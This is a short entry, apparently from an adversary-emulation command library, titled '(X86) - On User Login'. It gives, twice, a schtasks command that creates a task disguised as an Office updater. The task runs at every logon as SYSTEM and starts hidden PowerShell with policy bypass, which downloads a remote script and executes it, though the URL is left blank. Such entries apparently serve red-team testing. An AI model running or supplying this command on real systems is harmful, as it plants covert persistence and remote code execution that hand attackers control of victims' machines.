---
id: 6120b021-f7e8-44cd-9cb4-ed59b8df3722
name: (X86) - On User Login
type: command
executor: bash
data: 'schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe
  -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c ''IEX ((new-object
  net.webclient).downloadstring(''''''http:///''''''))''" /sc onlogon /ru System

  '
output: null
created_at: '2020-07-14T18:21:10.245355+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# (X86) - On User Login

```bash
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'" /sc onlogon /ru System

```


